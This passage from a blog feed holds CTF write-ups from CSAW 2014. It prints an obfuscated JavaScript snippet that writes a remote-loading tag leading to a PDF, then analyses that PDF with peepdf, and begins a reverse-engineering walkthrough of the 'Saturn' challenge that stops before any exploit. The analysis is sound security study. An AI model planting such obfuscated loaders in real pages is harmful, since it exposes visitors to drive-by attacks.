</span><span class='line'><span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">f</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>  <span class="nx">c</span> <span class="o">+=</span> <span class="nx">f</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">length</span><span class="p">.</span><span class="nx">toString</span><span class="p">();</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="nx">v</span> <span class="o">=</span> <span class="nx">f</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
</span><span class='line'><span class="nx">x</span> <span class="o">=</span> <span class="s2">&quot;\&#39;ht&quot;</span><span class="p">;</span>
</span><span class='line'><span class="nx">b</span> <span class="o">=</span> <span class="nx">f</span><span class="p">[</span><span class="mi">4</span><span class="p">];</span>
</span><span class='line'><span class="nx">f</span> <span class="o">=</span> <span class="mi">2541</span> <span class="o">*</span> <span class="mi">6</span> <span class="o">-</span> <span class="mi">35</span> <span class="o">+</span> <span class="mi">46</span> <span class="o">+</span> <span class="mi">12</span> <span class="o">-</span> <span class="mi">15269</span><span class="p">;</span>
</span><span class='line'><span class="nx">c</span> <span class="o">+=</span> <span class="nx">f</span><span class="p">.</span><span class="nx">toString</span><span class="p">();</span>
</span><span class='line'><span class="nx">f</span> <span class="o">=</span> <span class="p">(</span><span class="mi">56</span> <span class="o">+</span> <span class="mi">31</span> <span class="o">+</span> <span class="mi">68</span> <span class="o">*</span> <span class="mi">65</span> <span class="o">+</span> <span class="mi">41</span> <span class="o">-</span> <span class="mi">548</span><span class="p">)</span> <span class="o">/</span> <span class="mi">4000</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span>
</span><span class='line'><span class="nx">c</span> <span class="o">+=</span> <span class="nx">f</span><span class="p">.</span><span class="nx">toString</span><span class="p">();</span>
</span><span class='line'><span class="nx">f</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
</span><span class='line'><span class="nx">c</span> <span class="o">=</span> <span class="nx">c</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="s2">&quot;&quot;</span><span class="p">);</span>
</span><span class='line'><span class="kd">var</span> <span class="nx">w</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="nx">u</span> <span class="o">=</span> <span class="s2">&quot;s&quot;</span><span class="p">;</span>
</span><span class='line'><span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">c</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(((</span><span class="nx">i</span> <span class="o">==</span> <span class="mi">3</span> <span class="o">||</span> <span class="nx">i</span> <span class="o">==</span> <span class="mi">6</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">w</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">)</span> <span class="o">||</span> <span class="p">((</span><span class="nx">i</span> <span class="o">==</span> <span class="mi">8</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">w</span> <span class="o">==</span> <span class="mi">2</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>      <span class="nx">f</span> <span class="o">+=</span> <span class="nb">String</span><span class="p">.</span><span class="nx">fromCharCode</span><span class="p">(</span><span class="mi">46</span><span class="p">);</span>
</span><span class='line'>      <span class="nx">w</span><span class="o">++</span><span class="p">;</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>  <span class="nx">f</span> <span class="o">+=</span> <span class="nx">c</span><span class="p">[</span><span class="nx">i</span><span class="p">];</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="nx">i</span> <span class="o">=</span> <span class="nx">k</span> <span class="o">+</span> <span class="s2">&quot;anal&quot;</span><span class="p">;</span>
</span><span class='line'><span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="s2">&quot;&lt;&quot;</span> <span class="o">+</span> <span class="nx">m</span> <span class="o">+</span> <span class="s2">&quot; &quot;</span> <span class="o">+</span> <span class="nx">b</span> <span class="o">+</span> <span class="s2">&quot;=&quot;</span> <span class="o">+</span> <span class="nx">x</span> <span class="o">+</span> <span class="s2">&quot;tp:&quot;</span> <span class="o">+</span> <span class="nx">k</span> <span class="o">+</span> <span class="nx">k</span> <span class="o">+</span> <span class="nx">f</span> <span class="o">+</span> <span class="nx">i</span> <span class="o">+</span> <span class="s2">&quot;y&quot;</span> <span class="o">+</span> <span class="nx">g</span> <span class="o">+</span> <span class="s2">&quot;c&quot;</span> <span class="o">+</span> <span class="nx">u</span> <span class="o">+</span> <span class="nx">v</span> <span class="o">+</span> <span class="s2">&quot;j&quot;</span> <span class="o">+</span> <span class="nx">u</span> <span class="o">+</span> <span class="s2">&quot;\&#39;&gt;\&lt;/&quot;</span> <span class="o">+</span> <span class="nx">m</span> <span class="o">+</span> <span class="s2">&quot;\&gt;&quot;</span><span class="p">);</span>
</span></code></pre></td></tr></table></div></figure>


<p>The purpose of this javascript was to redirect the user to the following URL</p>

<pre><code>http://128.238.66.100/announcement.pdf
</code></pre>

<p>upon execution.</p>

<p>The PDF, when opened into a viewer looked as follow:</p>

<p><img class="center" src="http://swappage.github.io/images/2014-09-28/pdf.png"></p>

<p>and at a first look it looked just like an image of a wizard with text on it.</p>

<p>But it for sure was hiding something, the usage of PDF with attached malicious content is very common in waterhole attacks, so why not giving it a closer look with PDF analysis tools like peepdf?</p>

<pre><code># peepdf -i announcement.pdf 
Warning: Spidermonkey is not installed!!
Warning: pylibemu is not installed!!

File: announcement.pdf
MD5: 02794f436a5bb6100e2fe67714cf5933
SHA1: 322e70a561aeee3833145d7f0942c8e32fe24241
Size: 390303 bytes
Version: 1.4
Binary: True
Linearized: False
Encrypted: False
Updates: 0
Objects: 9
Streams: 4
Comments: 0
Errors: 0

Version 0:
    Catalog: 6
    Info: 7
    Objects (9): [1, 2, 3, 4, 5, 6, 7, 8, 9]
    Streams (4): [1, 2, 3, 8]
        Encoded (4): [1, 2, 3, 8]
    Suspicious elements:
        /Names: [6]
        /EmbeddedFiles: [6]
        /EmbeddedFile: [8]
</code></pre>

<p>Wow, so many objects,  it was really worth looking at it one by one more closely, because in fact in the 8th one we could spot:</p>

<pre><code>PPDF&gt; object 8

&lt;&lt; /Length 212
/Type /EmbeddedFile
/Filter /FlateDecode
/Params &lt;&lt; /Size 495
/Subtype /application/pdf &gt;&gt;
stream
var _0xee0b=["\x59\x4F\x55\x20\x44\x49\x44\x20\x49\x54\x21\x20\x43\x4F\x4E\x47\x52\x41\x54\x53\x21\x20\x66\x77\x69\x77\x2C\x20\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x20\x6F\x62\x66\x75\x73\x63\x61\x74\x69\x6F\x6E\x20\x69\x73\x20\x73\x6F\x66\x61\x20\x6B\x69\x6E\x67\x20\x64\x75\x6D\x62\x20\x20\x3A\x29\x20\x6B\x65\x79\x7B\x54\x68\x6F\x73\x65\x20\x46\x6C\x75\x66\x66\x79\x20\x42\x75\x6E\x6E\x69\x65\x73\x20\x4D\x61\x6B\x65\x20\x54\x75\x6D\x6D\x79\x20\x42\x75\x6D\x70\x79\x7D"];var y=_0xee0b[0];
endstream
</code></pre>

<p>The hex encoded text looked promising&hellip;</p>

<pre><code># python
Python 2.7.3 (default, Mar 14 2014, 11:57:14) 
[GCC 4.7.2] on linux2
Type "help", "copyright", "credits" or "license" for more information.
&gt;&gt;&gt; print "\x59\x4F\x55\x20\x44\x49\x44\x20\x49\x54\x21\x20\x43\x4F\x4E\x47\x52\x41\x54\x53\x21\x20\x66\x77\x69\x77\x2C\x20\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x20\x6F\x62\x66\x75\x73\x63\x61\x74\x69\x6F\x6E\x20\x69\x73\x20\x73\x6F\x66\x61\x20\x6B\x69\x6E\x67\x20\x64\x75\x6D\x62\x20\x20\x3A\x29\x20\x6B\x65\x79\x7B\x54\x68\x6F\x73\x65\x20\x46\x6C\x75\x66\x66\x79\x20\x42\x75\x6E\x6E\x69\x65\x73\x20\x4D\x61\x6B\x65\x20\x54\x75\x6D\x6D\x79\x20\x42\x75\x6D\x70\x79\x7D"
YOU DID IT! CONGRATS! fwiw, javascript obfuscation is sofa king dumb  :) key{Those Fluffy Bunnies Make Tummy Bumpy}
&gt;&gt;&gt;
</code></pre>

<p>So, finally, here was the flag!</p>

<pre><code>key{Those Fluffy Bunnies Make Tummy Bumpy}
</code></pre>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[CSAW 2014: Saturn Walkthrough]]></title>
    <link href="http://swappage.github.io/blog/2014/09/24/csaw-2014-saturn-walkthrough/"/>
    <updated>2014-09-24T21:20:47+02:00</updated>
    <id>http://swappage.github.io/blog/2014/09/24/csaw-2014-saturn-walkthrough</id>
    <content type="html"><![CDATA[<h2>Starring</h2>

<ul>
<li>Superkojiman as <em>My brain runs assembly code</em></li>
<li>Barrebas as <em>The silent disassembler ninja</em></li>
<li>Swappage as <em>The mumbler and random guesser</em></li>
</ul>


<p>Hello hello, Swappage here writing on behalf of the whole group that worked on this exploit dev :) please don&rsquo;t kill me as my English is really terrible, although it might also be Koji and Bas&#8217; fault for not reviewing this doc properly before publishing :p</p>

<p>During the past weekend me and a bunch of dudes from <a href="www.vulnhub.com">VulnHub</a> decided to test ourselves and play the CSAW 2014 CTF challenge. Along wight he 300 point Forensics challenge, Saturn at exploitation 400 was one of the more interesting ones to solve. This is our writeup on it.</p>

<!-- more -->


<p>the question from the challenge stated:</p>

<p><em>You have stolen the checking program for the CSAW Challenge-Response-Authentication-Protocol system. Unfortunately you forgot to grab the challenge-response keygen algorithm (libchallengeresponse.so). Can you still manage to bypass the secure system and read the flag?</em></p>

<p>So basically our objective was to find a way to bypass the challenge-response handshake authentication process handled by this binary to read the flag; it was also obvious that we were missing a component, which was supposed to handle the task of generating the challenge response, and that we needed to live with it.</p>

<h2>Getting the binary to run</h2>

<p>A quick check against the binary using ldd confirmed that we actually were missing a module which was needed for the application to run; relying simply on static analysis might be <strong>extremely</strong> frustrating and unproductive, so our first step was to make sure we could execute the binary locally to also perform dynamic analysis.
We came up with the following code snippet that we compiled as shared library:</p>

<p>Here is the .c snipplet</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">fillChallengeResponse</span><span class="p">()</span> <span class="p">{</span>
</span><span class='line'>  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>and the .h</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">int</span> <span class="nf">fillChallengeResponse</span><span class="p">();</span>
</span></code></pre></td></tr></table></div></figure>


<p>They were nothing but a dummy function but it was enough to be able to run the binary without it terminating.</p>

<h2>The application structure</h2>

<p>By doing some static analysis we determined that saturn was made of three main parts:</p>

<ul>
<li>one responsible for providing the client a challenge</li>
<li>one responsible for checking the response sent by the client to the server</li>
<li>and the last one that would print out the flag if the response from the client was correct.</li>
</ul>


<p>The access to these 3 branches was handled by something similar to a case switch, where the layout of the buffer sent by the client was verified for a sequence of commands as follows:</p>

<ul>
<li>if the first byte was in the range of 0xa0 to 0xaf the execution flow would get into the function responsible for providing the challenge to the client</li>
<li>if the first byte was in the range of 0xe0 to 0xef the execution flow would get into the function responsible for checking the response</li>
<li>if the first byte was a 0x80, the execution flow would get into the function responsible for printing the flag to stdout.</li>
</ul>


<p><img class="center" src="http://swappage.github.io/images/2014-09-24/caseswitch.png"></p>

<p>At this point we knew that intended way to interact with the binary was to</p>

<ul>
<li>send the command sequence to request a challenge</li>
<li>send the response</li>
<li>send the command to receive the flag</li>
</ul>


<h2>THe genChallenge() function</h2>

<p>Yes, i named it this way, in fact the binary was stripped, so while debugging using IDA i decided to rename it for making things easier :D
By the way&hellip;
The second step was to closely verify how the function responsible for providing the challenge to the client actually worked</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class='c-objdump'><span class='line'><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">0804885</span><span class="n">C</span>                 <span class="n">push</span>    <span class="n">ebp</span>
</span><span class='line'><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">0804885</span><span class="n">D</span>                 <span class="n">mov</span>     <span class="n">ebp</span><span class="p">,</span> <span class="n">esp</span>
</span><span class='line'><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mf">0804885F</span>                 <span class="n">push</span>    <span class="n">ebx</span>
</span><span class='line'><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">08048860</span>                 <span class="n">sub</span>     <span class="n">esp</span><span class="p">,</span> <span class="mi">34</span><span class="n">h</span>
</span><span class='line'><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">08048863</span>                 <span class="n">mov</span>     <span class="n">eax</span><span class="p">,</span> <span class="p">[</span><span class="n">ebp</span><span class="o">+</span><span class="n">arg_0</span><span class="p">]</span>
</span><span class='line'><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">08048866</span>                 <span class="n">mov</span>     <span class="p">[</span><span class="n">ebp</span><span class="o">+</span><span class="n">var_1C</span><span class="p">],</span> <span class="n">al</span>
</span><span class='line'><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">08048869</span>                 <span class="n">movzx</span>   <span class="n">eax</span><span class="p">,</span> <span class="p">[</span><span class="n">ebp</span><span class="o">+</span><span class="n">var_1C</span><span class="p">]</span>
</span><span class='line'><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">0804886</span><span class="n">D</span>                 <span class="n">and</span>     <span class="n">eax</span><span class="p">,</span> <span class="mf">0F</span><span class="n">h</span>          <span class="p">;</span> <span class="o">&lt;=====</span>
</span><span class='line'><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">08048870</span>                 <span class="n">mov</span>     <span class="p">[</span><span class="n">ebp</span><span class="o">+</span><span class="n">var_11</span><span class="p">],</span> <span class="n">al</span>
</span><span class='line'><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">08048873</span>                 <span class="n">mov</span>     <span class="n">eax</span><span class="p">,</span> <span class="n">off_804A050</span>     <span class="p">;</span> <span class="o">&lt;=====</span>
</span><span class='line'><span class="p">...</span>
</span><span class='line'><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">080488</span><span class="n">B9</span>                 <span class="n">mov</span>     <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mi">10</span><span class="n">h</span><span class="p">],</span> <span class="n">ebx</span>
</span><span class='line'><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">080488</span><span class="n">BD</span>                 <span class="n">mov</span>     <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mi">0</span><span class="n">Ch</span><span class="p">],</span> <span class="n">ecx</span>
</span><span class='line'><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">080488</span><span class="n">C1</span>                 <span class="n">mov</span>     <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mi">8</span><span class="p">],</span> <span class="n">edx</span>
</span><span class='line'><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">080488</span><span class="n">C5</span>                 <span class="n">mov</span>     <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mi">4</span><span class="p">],</span> <span class="n">eax</span>
</span><span class='line'><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">080488</span><span class="n">C9</span>                 <span class="n">mov</span>     <span class="n">dword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">esp</span><span class="p">],</span> <span class="n">offset</span> <span class="n">format</span> <span class="p">;</span> <span class="s">&quot;%c%c%c%c&quot;</span>
</span><span class='line'><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">080488</span><span class="n">D0</span>                 <span class="n">call</span>    <span class="n">_printf</span>
</span><span class='line'><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">080488</span><span class="n">D5</span>                 <span class="n">mov</span>     <span class="n">eax</span><span class="p">,</span> <span class="nl">ds</span><span class="p">:</span><span class="n">stdout</span>
</span><span class='line'><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">080488</span><span class="n">DA</span>                 <span class="n">mov</span>     <span class="p">[</span><span class="n">esp</span><span class="p">],</span> <span class="n">eax</span>      <span class="p">;</span> <span class="n">stream</span>
</span><span class='line'><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">080488</span><span class="n">DD</span>                 <span class="n">call</span>    <span class="n">_fflush</span>
</span><span class='line'><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mf">080488E2</span>                 <span class="n">add</span>     <span class="n">esp</span><span class="p">,</span> <span class="mi">34</span><span class="n">h</span>
</span><span class='line'><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mf">080488E5</span>                 <span class="n">pop</span>     <span class="n">ebx</span>
</span><span class='line'><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mf">080488E6</span>                 <span class="n">pop</span>     <span class="n">ebp</span>
</span></code></pre></td></tr></table></div></figure>


<p>We figured out that the challenge was read and returned to the client from a memory location controlled by the second digit of the byte, which meant that if we sent \xa0 we received 4 bytes, while if we were sending \xa1 we were receiving 4 other bytes.
This Part required a lot of testing and analysis by <em>talking</em> also to the real server, in fact we didn&rsquo;t have the library that would generate the challenge/response, and therefore these memory locations were all 0.</p>

<p>After a couple of trial and error, and thanks to superkojiman&rsquo;s smartness, we figured out that we could send a sequence of commands and read up to a total of 32 bytes of memory, by sending \xa0\xa1\xa2&hellip; and so on. (more on this later, as this is really important).</p>

<p>At this point we thought then, that the challenge, wasn&rsquo;t composed of 4 bytes, but probably by 32.</p>

<h2>The checkResponse() function</h2>

<p>The check response function was the one responsible for actually verifying the validity of the response provided by the client.</p>

<p>To access this branch of code the client had to send the proper command, in the range of 0xe0 to 0xef followed by a sequence of 4 bytes representing (part) of the response.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
</pre></td><td class='code'><pre><code class='c-objdump'><span class='line'><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mf">080488E8</span>                 <span class="n">push</span>    <span class="n">ebp</span>
</span><span class='line'><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mf">080488E9</span>                 <span class="n">mov</span>     <span class="n">ebp</span><span class="p">,</span> <span class="n">esp</span>
</span><span class='line'><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">080488</span><span class="n">EB</span>                 <span class="n">sub</span>     <span class="n">esp</span><span class="p">,</span> <span class="mi">28</span><span class="n">h</span>
</span><span class='line'><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">080488</span><span class="n">EE</span>                 <span class="n">mov</span>     <span class="n">eax</span><span class="p">,</span> <span class="p">[</span><span class="n">ebp</span><span class="o">+</span><span class="n">arg_0</span><span class="p">]</span>
</span><span class='line'><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mf">080488F</span><span class="mi">1</span>                 <span class="n">mov</span>     <span class="p">[</span><span class="n">ebp</span><span class="o">+</span><span class="n">var_1C</span><span class="p">],</span> <span class="n">al</span>
</span><span class='line'><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mf">080488F</span><span class="mi">4</span>                 <span class="n">movzx</span>   <span class="n">eax</span><span class="p">,</span> <span class="p">[</span><span class="n">ebp</span><span class="o">+</span><span class="n">var_1C</span><span class="p">]</span>
</span><span class='line'><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mf">080488F</span><span class="mi">8</span>                 <span class="n">and</span>     <span class="n">eax</span><span class="p">,</span> <span class="mf">0F</span><span class="n">h</span>
</span><span class='line'><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mf">080488F</span><span class="n">B</span>                 <span class="n">mov</span>     <span class="p">[</span><span class="n">ebp</span><span class="o">+</span><span class="n">var_15</span><span class="p">],</span> <span class="n">al</span>
</span><span class='line'><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mf">080488F</span><span class="n">E</span>                 <span class="n">mov</span>     <span class="n">eax</span><span class="p">,</span> <span class="n">off_804A054</span>      <span class="p">;</span> <span class="o">&lt;==</span> <span class="n">the</span> <span class="n">memory</span> <span class="n">location</span> <span class="n">from</span> <span class="n">which</span> <span class="n">the</span> <span class="n">response</span> <span class="n">is</span> <span class="n">read</span>
</span><span class='line'><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">08048903</span>                 <span class="n">movzx</span>   <span class="n">edx</span><span class="p">,</span> <span class="p">[</span><span class="n">ebp</span><span class="o">+</span><span class="n">var_15</span><span class="p">]</span>
</span><span class='line'><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">08048907</span>                 <span class="n">shl</span>     <span class="n">edx</span><span class="p">,</span> <span class="mi">2</span>
</span><span class='line'><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">0804890</span><span class="n">A</span>                 <span class="n">add</span>     <span class="n">eax</span><span class="p">,</span> <span class="n">edx</span>
</span><span class='line'><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">0804890</span><span class="n">C</span>                 <span class="n">mov</span>     <span class="n">eax</span><span class="p">,</span> <span class="p">[</span><span class="n">eax</span><span class="p">]</span>
</span><span class='line'><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">0804890</span><span class="n">E</span>                 <span class="n">mov</span>     <span class="p">[</span><span class="n">ebp</span><span class="o">+</span><span class="n">var_10</span><span class="p">],</span> <span class="n">eax</span>
</span><span class='line'><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">08048911</span>                 <span class="n">mov</span>     <span class="n">dword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mi">8</span><span class="p">],</span> <span class="mi">4</span> <span class="p">;</span> <span class="n">nbytes</span>
</span><span class='line'><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">08048919</span>                 <span class="n">lea</span>     <span class="n">eax</span><span class="p">,</span> <span class="p">[</span><span class="n">ebp</span><span class="o">+</span><span class="n">buf</span><span class="p">]</span>
</span><span class='line'><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">0804891</span><span class="n">C</span>                 <span class="n">mov</span>     <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mi">4</span><span class="p">],</span> <span class="n">eax</span>    <span class="p">;</span> <span class="n">buf</span>
</span><span class='line'><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">08048920</span>                 <span class="n">mov</span>     <span class="n">dword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">esp</span><span class="p">],</span> <span class="mi">0</span> <span class="p">;</span> <span class="n">fd</span>
</span><span class='line'><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">08048927</span>                 <span class="n">call</span>    <span class="n">_read</span>
</span><span class='line'><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">0804892</span><span class="n">C</span>                 <span class="n">mov</span>     <span class="n">eax</span><span class="p">,</span> <span class="p">[</span><span class="n">ebp</span><span class="o">+</span><span class="n">buf</span><span class="p">]</span>
</span><span class='line'><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mf">0804892F</span>                 <span class="n">mov</span>     <span class="p">[</span><span class="n">ebp</span><span class="o">+</span><span class="n">var_C</span><span class="p">],</span> <span class="n">eax</span>
</span><span class='line'><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">08048932</span>                 <span class="n">mov</span>     <span class="n">eax</span><span class="p">,</span> <span class="p">[</span><span class="n">ebp</span><span class="o">+</span><span class="n">var_C</span><span class="p">]</span>
</span><span class='line'><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">08048935</span>                 <span class="n">cmp</span>     <span class="n">eax</span><span class="p">,</span> <span class="p">[</span><span class="n">ebp</span><span class="o">+</span><span class="n">var_10</span><span class="p">]</span>
</span><span class='line'><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">08048938</span>                 <span class="n">jz</span>      <span class="kt">short</span> <span class="n">loc_8048946</span>
</span><span class='line'><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">0804893</span><span class="n">A</span>                 <span class="n">mov</span>     <span class="n">dword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">esp</span><span class="p">],</span> <span class="mi">0</span> <span class="p">;</span> <span class="n">status</span>
</span><span class='line'><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">08048941</span>                 <span class="n">call</span>    <span class="n">_exit</span>
</span><span class='line'><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">08048946</span>
</span><span class='line'><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">08048946</span> <span class="nl">loc_8048946</span><span class="p">:</span>
</span><span class='line'><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">08048946</span>                 <span class="n">movzx</span>   <span class="n">eax</span><span class="p">,</span> <span class="p">[</span><span class="n">ebp</span><span class="o">+</span><span class="n">var_15</span><span class="p">]</span>
</span><span class='line'><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">0804894</span><span class="n">A</span>                 <span class="n">mov</span>     <span class="nl">ds</span><span class="p">:</span><span class="n">dword_804A0A0</span><span class="p">[</span><span class="n">eax</span><span class="o">*</span><span class="mi">4</span><span class="p">],</span> <span class="mi">1</span>   <span class="p">;</span> <span class="o">&lt;==</span> <span class="k">if</span> <span class="n">bytes</span> <span class="n">are</span> <span class="n">correct</span> <span class="n">this</span> <span class="n">memory</span> <span class="n">location</span> <span class="n">is</span> <span class="n">set</span> <span class="n">to</span> <span class="mi">1</span>
</span><span class='line'><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">08048955</span>                 <span class="n">leave</span>
</span><span class='line'><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">08048956</span>                 <span class="n">retn</span>
</span></code></pre></td></tr></table></div></figure>


<p>Again, we missed the library responsible for generating the challenge response, so everything was 0 to us yet we could figure out that</p>

<ul>
<li>if the bytes were correct the memory location at address <em>dword_804A0A0[eax</em>4]* was set to 1</li>
<li>if the bytes were wrong exit() was called instead causing the application to terminate.</li>
</ul>


<p>At this point that was all we knew, as we were still missing an important part of the puzzle, which comes into play when the function that is supposed to finally open and read the flag for us is called.</p>

<h2>A matter of cycling</h2>

<p>We thought we were really close to solving the puzzle, but we were obviously proved wrong.</p>

<p>If we take a look at the graph of the function responsible of opening the flag.txt file and then writing it to stdout, we can notice that there is a funny and evil function which i decided to name Cycles()</p>

<p><img class="center" src="http://swappage.github.io/images/2014-09-24/openfile.png"></p>

<p>Apparantly it looks like that depending on the return value of that function, we would or wouldn&rsquo;t be able to read the flag.</p>

<p>Let&rsquo;s give a quick look at the function</p>

<p><img class="center" src="http://swappage.github.io/images/2014-09-24/cycles.png"></p>

<p>The concept is as simple as this:</p>

<ul>
